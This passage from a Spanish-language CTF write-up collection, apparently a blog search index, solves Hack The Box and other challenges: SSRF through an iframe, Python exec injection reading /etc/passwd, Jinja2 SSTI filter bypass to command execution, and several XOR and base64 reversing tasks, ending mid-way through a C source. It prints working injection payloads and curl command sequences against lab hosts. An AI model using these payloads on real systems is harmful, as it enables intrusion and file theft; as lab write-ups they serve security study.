(HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/baby-auth/","section":"ctf","summary":"Cookies de sesión. Bypass the autenticación","time":0,"title":"baby auth"},{"contents":"Tenemos una aplicación web en Flask que nos permite renderizar otras páginas web como una imagen:\nPor detrás, el servidor lanza un Headless Chrome con selenium, accede a la página que le indicamos y toma una captura de pantalla para mostrarla. Aquí hay un ejemplo:\nEl objetivo es llegar a la ruta /flag:\n@web.route('/flag') @is_from_localhost def flag(): return send_file('flag.png')  Sin embargo, está protegida verificando que la petición se realiza desde 127.0.0.1 y sin cabecera Referer:\ndef is_from_localhost(func): @functools.wraps(func) def check_ip(*args, **kwargs): if request.remote_addr != '127.0.0.1' or request.referrer: return abort(403) return func(*args, **kwargs) return check_ip  La idea es montar un servidor web que aloje este archivo index.html:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe referrerpolicy=\"no-referrer\" src=\"http://127.0.0.1/flag\"\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Si la aplicación web es capaz de recibir el archivo, entonces el iframe será llamado desde el propio servidor (el Headless Chrome local), y la petición irá desde localhost (127.0.0.1). Además, indicando referrerpolicy=\u0026quot;no-referrer\u0026quot; nos aseguramos de que no se añade la cabecera Referer en la petición HTTP.\nPodemos crear este servidor fácilmente con Python (si ejecutamos python -m http.server, se arrancará un servidor en el puerto 8000). Y para hacerlo accesible, podemos utilizar ngrok con el siguiente comando:\n$ ngrok http 8000 ngrok Session Status online Account Rocky (Plan: Free) Version 2.3.40 Region United States (us) Latency 104.541459ms Web Interface http://127.0.0.1:4040 Forwarding https://abcd-12-34-56-78.ngrok.io - http://localhost:8000 Connections ttl opn rt1 rt5 p50 p90 1 0 0.00 0.00 0.00 0.00  Ahora cogemos la URL pública de ngrok y la ponemos en la aplicación web. Veremos algunas peticiones en el registro del servidor:\n$ python3 -m http.server Serving HTTP on :: port 8000 (http://[::]:8000/) ... ::1 - - [] \"GET / HTTP/1.1\" 200 - ::1 - - [] code 404, message File not found ::1 - - [] \"GET /favicon.ico HTTP/1.1\" 404 -  Entonces, la aplicación web renderizará una imagen que contiene la flag dentro de nuestro iframe:\nY aquí está la flag (HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_t1m3}):\nAunque hemos conseguido la flag, la vía intencionada es utilizando DNS rebinding. La idea principal es poner un dominio que resuelva a una dirección IP externa, y justo después de la verificación, cambiar la resolución a una dirección IP local (como si fuera una condición de carrera), de manera que se accede a la ruta /flag correctamente.\nCon ngrok (externo) y el iframe sin cabecera Referer apuntando a 127.0.0.1 (interno) es posible saltarse las dos verificaciones.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/baby-cachedview/","section":"ctf","summary":"SSRF mediante iframe","time":1,"title":"baby CachedView"},{"contents":"Se nos proporciona un binario llamado baby_crypt:\n$ file baby_crypt baby_crypt: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=24af7e68eab982022ea63c1828813c3bfa671b51, for GNU/Linux 3.2.0, not stripped  Si lo abrimos en Ghidra, veremos esta función main:\nintmain() { char*key; longin_FS_OFFSET; inti; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined2 local_20; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); printf(\"Give me the key and I\\'ll give you the flag: \"); key =(char*) malloc(4); fgets(key, 4, stdin); local_38 =0x6f0547480c35643f; local_30 =0x28130304026f0446; local_28 =0x5000f4358280e52; local_20 =0x4d56; for(i =0; i \u0026lt;0x1a; i =i +1) { *(byte *) ((long) \u0026amp;local_38 +(long) i) =*(byte *) ((long) \u0026amp;local_38 +(long) i) ^key[i %3]; } printf(\"%.26s\\n\", \u0026amp;local_38); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  Básicamente, pregunta por una clave de 3 bytes y realiza un cifrado XOR. Como la salida esperada es la flag y conocemos su formato (HTB{...}), podemos invertir el cifrado XOR y obtener la clave esperada.\nSean $m$ el byte en texto claro, $k$ el byte the la clave y $c$ el byte cifrado. El cifrado XOR tiene la siguiente propiedad:\n$$ c = m \\oplus k \\iff k = c \\oplus m $$\nPor tanto, podemos tomar los primeros tres bytes del texto cifrado (variable llamada local_38, en formato little-endian) y aplicar XOR con los bytes en texto claro:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; chr(ord('H') ^ 0x3f) 'w' \u0026gt;\u0026gt;\u0026gt; chr(ord('T') ^ 0x64) '0' \u0026gt;\u0026gt;\u0026gt; chr(ord('B') ^ 0x35) 'w'  Y así conseguimos la clave (w0w). Vamos a capturar la flag:\n$ ./baby_crypt Give me the key and I'll give you the flag: w0w HTB{x0r_1s_us3d_by_h4x0r!}  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/baby-crypt/","section":"ctf","summary":"Cifrado XOR","time":1,"title":"Baby Crypt"},{"contents":"Se nos proporciona esta página web:\nSi miramos el código HTML de la página, veremos /debug:\nY ahí tenemos el código fuente de la aplicación web:\nfromflaskimportFlask, Response, request, render_template, request fromrandomimportchoice, randint fromstringimportlowercase fromfunctoolsimportwraps app=Flask(__name__) defcalc(recipe): globalgarage garage={} try: exec(recipe, garage) except: pass defGCR(func): # Great Calculator of the observable universe and it's infinite timelines @wraps(func) deffederation(*args, **kwargs): ingredient=''.join(choice(lowercase) for_inrange(10)) recipe='%s= %s'%(ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)]))) ifrequest.method=='POST': ingredient=request.form.get('ingredient', '') recipe='%s= %s'%(ingredient, request.form.get('measurements', '')) calc(recipe) ifgarage.get(ingredient, ''): returnrender_template('index.html', calculations=garage[ingredient]) returnfunc(*args, **kwargs) returnfederation @app.route('/', methods=['GET', 'POST']) @GCR defindex(): returnrender_template('index.html') @app.route('/debug') defdebug(): returnResponse(open(__file__).read(), mimetype='text/plain') if__name__=='__main__': app.run('0.0.0.0', port=1337)  Si enviamos una petición POST a /, podremos indicar ingredient y measurements para controlar la variable recipe:\nifrequest.method=='POST': ingredient=request.form.get('ingredient', '') recipe='%s= %s'%(ingredient, request.form.get('measurements', '')) calc(recipe) ifgarage.get(ingredient, ''): returnrender_template('index.html', calculations=garage[ingredient])  Y la función calc nos permite ejecutar código Python mediante exec:\ndefcalc(recipe): globalgarage garage={} try: exec(recipe, garage) except: pass  Y entonces conseguimos algo como:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; ingredient = 'asdf' \u0026gt;\u0026gt;\u0026gt; measurements = 1337 \u0026gt;\u0026gt;\u0026gt; recipe = '%s = %s' % (ingredient, measurements) \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; garage = {} \u0026gt;\u0026gt;\u0026gt; exec(recipe, garage) \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; garage[ingredient] 1337  La idea es reemplazar 1337 con el contenido de un archivo remoto. Para esto, podemos buscar en PayloadsAllTheThings:\n''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()  $ curl 167.99.202.193:30358 -d \"ingredient=asdf\u0026measurements=''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\" \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name='viewport' content='width=device-width, initial-scale=1'\u0026gt; \u0026lt;meta name='author' content='makelaris'\u0026gt; \u0026lt;title\u0026gt;🌌 on Venzenulon 9\u0026lt;/title\u0026gt; \u0026lt;link rel='stylesheet' href='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' integrity='sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T' crossorigin='anonymous'\u0026gt; \u0026lt;link href='//fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'\u0026gt; \u0026lt;style\u0026gt;html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img class='mx-auto d-block img-responsive' src='//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif'\u0026gt; \u0026lt;h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'\u0026gt;root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin postgres:x:70:70::/var/lib/postgresql:/bin/sh cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin \u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- /debug --\u0026gt; \u0026lt;/html\u0026gt;  Y ahí tenemos el archivo /etc/passwd. Vamos a leer el archivo flag:\n$ curl 167.99.202.193:30358 -d \"ingredient=asdf\u0026measurements='\\\\n'%2b''.__class__.__mro__[2].__subclasses__()[40]('flag').read()\" \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name='viewport' content='width=device-width, initial-scale=1'\u0026gt; \u0026lt;meta name='author' content='makelaris'\u0026gt; \u0026lt;title\u0026gt;🌌 on Venzenulon 9\u0026lt;/title\u0026gt; \u0026lt;link rel='stylesheet' href='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' integrity='sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T' crossorigin='anonymous'\u0026gt; \u0026lt;link href='//fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'\u0026gt; \u0026lt;style\u0026gt;html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img class='mx-auto d-block img-responsive' src='//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif'\u0026gt; \u0026lt;h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'\u0026gt; HTB{n3v3r_trust1ng_us3r_1nput_ag41n_1n_my_l1f3}\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- /debug --\u0026gt; \u0026lt;/html\u0026gt;  Otra manera de encontrar el archivo flag es consiguiendo ejecución remota de comandos con otro payload.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/baby-interdimensional-internet/","section":"ctf","summary":"Inyección de código. Lectura de archivo remoto","time":1,"title":"baby interdimensional internet"},{"contents":"Se nos proporciona esta página web:\nExiste un comentario en el código HTML de la página que indica una URL de depuración (/debug):\nEn esta ruta /debug, podemos encontrar el código fuente:\n$ curl 157.245.33.77:31650/debug  from flask import Flask, session, render_template, request, Response, render_template_string, g import functools, sqlite3, os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(120) acc_tmpl = '''{% extends 'index.html' %} {% block content %} \u0026lt;h3\u0026gt;baby_ninja joined, total number of rebels: reb_num\u0026lt;br\u0026gt; {% endblock %} ''' def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect('/tmp/ninjas.db') db.isolation_level = None db.row_factory = sqlite3.Row db.text_factory = (lambda s: s.replace('{{', ''). replace(\"'\", '\u0026amp;#x27;'). replace('\"', '\u0026amp;quot;'). replace('\u0026lt;', '\u0026amp;lt;'). replace('\u0026gt;', '\u0026amp;gt;') ) return db def query_db(query, args=(), one=False): with app.app_context(): cur = get_db().execute(query, args) rv = [dict((cur.description[idx][0], str(value)) \\ for idx, value in enumerate(row)) for row in cur.fetchall()] return (rv[0] if rv else None) if one else rv @app.before_first_request def init_db(): with app.open_resource('schema.sql', mode='r') as f: get_db().cursor().executescript(f.read()) @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() def rite_of_passage(func): @functools.wraps(func) def born2pwn(*args, **kwargs): name = request.args.get('name', '') if name: query_db('INSERT INTO ninjas (name) VALUES (\"%s\")' % name) report = render_template_string(acc_tmpl. replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']). replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next()) ) if session.get('leader'): return report return render_template('welcome.jinja2') return func(*args, **kwargs) return born2pwn @app.route('/') @rite_of_passage def index(): return render_template('index.html') @app.route('/debug') def debug(): return Response(open(__file__).read(), mimetype='text/plain') if __name__ == '__main__': app.run(host='0.0.0.0', port=1337, debug=True)  Como está utilizando Flask como framework web y Jinja2 como motor de plantillas, la vulnerabilidad está relacionada con Server-Side Template Injection (SSTI).\nEl servidor está filtrando algunos caracteres para prevenir SSTI, por lo que estos son los caracteres que no podremos usar en el payload:\n{{ ' \"  Sin embargo, aún podemos usar técnicas de bypassing para ejecutar comandos sin emplear dichos caracteres. Mirando en PayloadsAllTheThings, podemos encontrar estos payloads:\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen(request.args.input).read() }}{% endif %}{% endfor %} http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}\u0026f=%s%sclass%s%s\u0026a=_  Entonces, podemos introducir strings en nuestro payload con más parámetros de URL, y evitamos el uso de {{ ... }} con bloques {% ... %}.\nPodemos tomar control sobre la respuesta HTML de la página si nuestra sesión contiene la clave leader, por lo que podemos añadirla mediante SSTI y mostrar nuestra entrada controlada:\n$ curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.leader: True}) or True %} asdf {% endif %}' --data-urlencode leader=leader | grep asdf \u0026lt;h3\u0026gt; asdf joined, total number of rebels: 13\u0026lt;br\u0026gt;  No obstante, como no podemos usar {{, no podremos visualizar la salida de algún comando. Además, la instancia remota no tiene conexión a Internet, por lo que las reverse shells no son posibles.\nLa modificación de la sesión debe ser una pista, ya que podemos utilizar el diccionario de sesión para introducir la salida de nuestros comandos. Por ejemplo:\n$ curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) %}{% endif %}' --data-urlencode c=c --data-urlencode cmd=whoami | grep session Set-Cookie: session=eyJjIjoibm9ib2R5XG4ifQ.Yo1aQQ.Z_2DY8zZX4NhCASvRpQKwdKp6-o; HttpOnly; Path=/ $ echo eyJjIjoibm9ib2R5XG4ifQ | base64 -d {\"c\":\"nobody\\n\" $ curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) %}{% endif %}' --data-urlencode c=c --data-urlencode cmd=whoami | grep session | awk -F = '{ print $2 }' | awk -F . '{ print $1 }' | base64 -d {\"c\":\"nobody\\n\"  Ahora podemos meter todos estos comandos en una función de Bash para ejecutar comandos más fácilmente:\n$ function exec_cmd() { curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) %}{% endif %}' --data-urlencode c=c --data-urlencode \"cmd=$1\" | grep session | awk -F = '{ print $2 }' | awk -F . '{ print $1 }' | base64 -d } $ exec_cmd whoami {\"c\":\"nobody\\n\"  En este punto, podemos buscar la flag y capturarla:\n$ exec_cmd ls {\"c\":\"app.py\\nflag_P54ed\\nschema.sql\\nstatic\\ntemplates\\n $ exec_cmd 'cat flag*' {\"c\":\"HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}\\n\"  Adicionalmente, escribí un script en Python para automatizar la ejecución de comandos y el filtrado: ssti.py (explicación detallada aquí).\n$ python3 ssti.py 157.245.33.77:31650 $ whoami nobody $ ls app.py flag_P54ed schema.sql static templates $ cat flag_P54ed HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/baby-ninja-jinja/","section":"ctf","summary":"SSTI con caracteres limitados","time":3,"title":"baby ninja jinja"},{"contents":"Se nos proporciona un binario llamado baby:\n$ file baby baby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25adc53b89f781335a27bf1b81f5c4cb74581022, for GNU/Linux 3.2.0, not stripped  Si lo ejecutamos, pregunta por una clave:\n$ ./baby Insert key:  Podemos introducir una clave y ver que no es correcta:\n$ ./baby Insert key: 1234 Try again later.  Podemos hacer uso de ltrace para ver las llamadas a funciones externas (funciones que pertenecen a librerías como Glibc):\n$ ltrace ./baby puts(\"Insert key: \"Insert key: ) = 13 fgets(  Por ejemplo, utiliza puts para mostrar el mensaje y fgets para leer nuestra entrada. Si ponemos algo de texto, vemos algo interesante:\n$ ltrace ./baby puts(\"Insert key: \"Insert key: ) = 13 fgets(1234 \"1234\\n\", 20, 0x7fb37e452980) = 0x7fffa441c7a0 strcmp(\"1234\\n\", \"abcde122313\\n\") = -48 puts(\"Try again later.\"Try again later. ) = 17 +++ exited (status 0) +++  Está comparando nuestra entrada con \u0026quot;abcde122313\\n\u0026quot;, por lo que esta es la clave que tenemos que introducir:\n$ ./baby Insert key: abcde122313 HTB{B4BY_R3V_TH4TS_EZ}  Hay tres maneras más de resolver el reto:\n Descompilar el binario con Ghidra o IDA para ver la instrucción strcmp. Utilizar un depurador como GDB para obtener el valor esperado de la clave. Ejecutar strings sobre el binario para visualizar la clave válida.  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/baby-re/","section":"ctf","summary":"Clave escrita en un archivo binario","time":0,"title":"Baby RE"},{"contents":"Se nos proporciona un binario llamado chall:\n$ file chall chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=151528987cd274999ec93665ef2d6a7678c5107b, for GNU/Linux 3.2.0, stripped  Si lo ejecutamos, nos pregunta por la flag:\n$ ./chall Hello! Welcome to SEETF. Please enter the flag. SEE{asdf} Flag wrong. Try again.  Vamos a abrir el binario en Ghidra para analizar el código en C descompilado. Esta es la función main. Puede parecer muy compleja porque hay muchas asignaciones:\nundefined8 main() { char *pcVar1; undefined4 *puVar2; size_t length; ulong i; ulong i_copy; char flag_input[128]; undefined4 local_d8[4]; undefined4 local_c8; undefined4 uStack196; undefined4 uStack192; undefined4 uStack188; undefined4 local_b8; undefined4 uStack180; undefined4 uStack176; undefined4 uStack172; undefined4 local_a8; undefined4 uStack164; undefined4 uStack160; undefined4 uStack156; undefined4 local_98; undefined4 uStack148; undefined4 uStack144; undefined4 uStack140; undefined4 local_88; undefined4 uStack132; undefined4 uStack128; undefined4 uStack124; undefined4 local_78; undefined4 uStack116; undefined4 uStack112; undefined4 uStack108; undefined4 local_68; undefined4 uStack100; undefined4 uStack96; undefined4 uStack92; undefined4 local_58; undefined4 uStack84; undefined4 uStack80; undefined4 uStack76; undefined4 local_48; undefined4 uStack68; undefined4 uStack64; undefined4 uStack60; undefined4 local_38; undefined4 uStack52; undefined4 uStack48; undefined4 uStack44; undefined4 local_28; undefined4 uStack36; undefined4 uStack32; undefined4 uStack28; undefined4 local_18; undefined4 uStack20; undefined4 uStack16; undefined4 uStack12; byte i_byte; puts(\"Hello! Welcome to SEETF. Please enter the flag.\"); local_d8[0] = 0x98; local_d8[1] = 0x8b; local_d8[2] = 0x88; local_d8[3] = 0xc3; local_c8 = 0x71; uStack196 = 0xb6; uStack192 = 0x7e; uStack188 = 0xa3; local_b8 = 0x72; uStack180 = 0xbb; uStack176 = 0x73; uStack172 = 0x7d; local_a8 = 0x7a; uStack164 = 0xa9; uStack160 = 0x74; uStack156 = 0x73; local_98 = 0x68; uStack148 = 0xa4; uStack144 = 0xb6; uStack140 = 0x6e; local_88 = 0x62; uStack132 = 0xbc; uStack128 = 0x61; uStack124 = 0x61; local_78 = 0x62; uStack116 = 0xb3; uStack112 = 0x67; uStack108 = 0xbc; local_68 = 0x61; uStack100 = 0x6b; uStack96 = 0xb8; uStack92 = 0xb5; local_58 = 0x56; uStack84 = 0x54; uStack80 = 0x89; uStack76 = 0x55; local_48 = 0x8c; uStack68 = 0x50; uStack64 = 0x5b; uStack60 = 0x51; local_38 = 0x53; uStack52 = 0x54; uStack48 = 0x5d; uStack44 = 0x5e; local_28 = 0x50; uStack36 = 0x86; uStack32 = 0x89; uStack28 = 0x89; local_18 = 0x48; uStack20 = 0x4f; uStack16 = 0x49; uStack12 = 0xf1; fgets(flag_input, 0x80, stdin); length = strlen(flag_input); if (length == 53) { puts(\"Good work! Your flag is the correct size.\"); puts(\"On to the flag check itself...\"); length = strlen(flag_input); i = 0; do { i_copy = i \u0026amp; 0xffffffff; if (length - 1 == i) { puts(\"Success! Go get your points, champ.\"); return 0; } pcVar1 = flag_input + i; puVar2 = local_d8 + i; i_byte = (byte) i; i = i + 1; } while ((byte) *puVar2 == (byte) (*pcVar1 + 0x45U ^ i_byte)); printf(\"Flag check failed at index: %d\", i_copy); } else { printf(\"Flag wrong. Try again.\"); } return 1; }  Nótese que la flag tiene que tener 53 caracteres (realmente 52, porque el último carácter representa el salto de línea):\n$ python3 -c 'print(\"A\" * 47)' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $ ./chall Hello! Welcome to SEETF. Please enter the flag. SEE{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA} Good work! Your flag is the correct size. On to the flag check itself... Flag check failed at index: 4  Aquí hay dos posibilidades para resolver el reto. Una es probar cada carácter (por ejemplo, para el índice 4) de la flag hasta ver el mensaje \u0026quot;Flag check failed at index: 5\u0026quot;. Luego, podemos construir la flag carácter a carácter.\nSin embargo, resulta más sencillo invertir el algoritmo de cifrado (que utiliza XOR), ya que sabemos cómo se toma nuestra entrada de datos y cómo se compara con la flag cifrada.\nEste es el script que soluciona el reto:\n#!/usr/bin/env python3 flag_enc = [ 0x98, 0x8b, 0x88, 0xc3, 0x71, 0xb6, 0x7e, 0xa3, 0x72, 0xbb, 0x73, 0x7d, 0x7a, 0xa9, 0x74, 0x73, 0x68, 0xa4, 0xb6, 0x6e, 0x62, 0xbc, 0x61, 0x61, 0x62, 0xb3, 0x67, 0xbc, 0x61, 0x6b, 0xb8, 0xb5, 0x56, 0x54, 0x89, 0x55, 0x8c, 0x50, 0x5b, 0x51, 0x53, 0x54, 0x5d, 0x5e, 0x50, 0x86, 0x89, 0x89, 0x48, 0x4f, 0x49, 0xf1 ] fori, cinenumerate(flag_enc): print(chr(((c^i) -0x45)), end='')  $ python3 solve.py SEE{0n3_5m411_573p_81d215e8b81ae10f1c08168207fba396}  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/other/babyreeee/","section":"ctf","summary":"SEETF 2022. Inversión de algoritmo de cifrado. XOR","time":3,"title":"babyreeee"},{"contents":"Nos dan este texto:\nQ1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K\nComo está compuesto por números y letras en mayúsculas y minúsculas, parece que está codificado en Base64.\nDe hechom el nombre del reto es \u0026ldquo;2 2 the 6\u0026rdquo; (\u0026quot;2 to the 6\u0026quot;), por lo que $2^6 = 64$.\nPodemos decodificarlo en una consola de comandos:\n$ echo Q1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K | base64 -d CTFlearn{FlaggyWaggyRaggy}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/base-2-2-the-6/","section":"ctf","summary":"Decodificación en Base64","time":0,"title":"Base 2 2 the 6"},{"contents":"Se nos pide representar 51 en base 12. Esto es simple:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; def dec_to_base(n: int, b: int) - int: ... digits = [] ... while n: ... digits.append(n % b) ... n //= b ... return int(''.join(map(str, digits[::-1]))) ... \u0026gt;\u0026gt;\u0026gt; dec_to_base(51, 12) 43 \u0026gt;\u0026gt;\u0026gt; 4 * 12 + 3 51  Y la flag es ictf{43}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/basic/","section":"ctf","summary":"ImaginaryCTF 03/07/2022. 30 puntos. Base numérica","time":0,"title":"basic"},{"contents":"Se nos proporciona el código fuente en C de un programa que está en ejecución en remoto:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define WAIT 60 static const char* flag = \"[REDACTED]\"; static char data[10][100]; static int input_lengths[10]; static int inputs = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if(l \u0026lt;= 0) { printf(\"'l' for tgetinput must be greater than 0\\n\"); return -2; } /* Empty the FD Set */ FD_ZERO(\u0026amp;input_set); /* Listen to the input descriptor */ FD_SET(STDIN_FILENO, \u0026amp;input_set); /* Waiting for some seconds */ timeout.tv_sec = WAIT; // WAIT seconds timeout.tv_usec = 0; // 0 milliseconds /* Listening for input stream for any activity */ ready_for_reading = select(1, \u0026amp;input_set, NULL, NULL, \u0026amp;timeout); /* Here, first parameter is number of FDs in the set, * second is our FD set for reading, * third is the FD set in which any write activity needs to updated, * which is not required in this case. * Fourth is timeout */ if (ready_for_reading == -1) { /* Some error has occured in input */ printf(\"Unable to read your input\\n\"); return -1; } if (ready_for_reading) { read_bytes = read(0, input, l-1); if(input[read_bytes-1]=='\\n'){ --read_bytes; input[read_bytes]='\\0'; } if(read_bytes==0){ printf(\"No data given.\\n\"); return -4; } else { return 0; } } else { printf(\"Timed out waiting for user input. Press Ctrl-C to disconnect\\n\"); return -3; } return 0; } static void data_write() { char input[100]; char len[4]; long length; int r; printf(\"Please enter your data:\\n\"); r = tgetinput(input, 100); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } while (true) { printf(\"Please enter the length of your data:\\n\"); r = tgetinput(len, 4); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((length = strtol(len, NULL, 10)) == 0) { puts(\"Please put in a valid length\"); } else { break; } } if (inputs \u0026gt; 10) { inputs = 0; } strcpy(data[inputs], input); input_lengths[inputs] = length; printf(\"Your entry number is: %d\\n\", inputs + 1); inputs++; } static void data_read() { char entry[4]; long entry_number; char output[100]; int r; memset(output, '\\0', 100); printf(\"Please enter the entry number of your data:\\n\"); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); } entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output); } int main(int argc, char** argv) { char input[3] = {'\\0'}; long command; int r; puts(\"Hi, welcome to my echo chamber!\"); puts(\"Type '1' to enter a phrase into our database\"); puts(\"Type '2' to echo a phrase in our database\"); puts(\"Type '3' to exit the program\"); while (true) { r = tgetinput(input, 3); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((command = strtol(input, NULL, 10)) == 0) { puts(\"Please put in a valid number\"); } else if (command == 1) 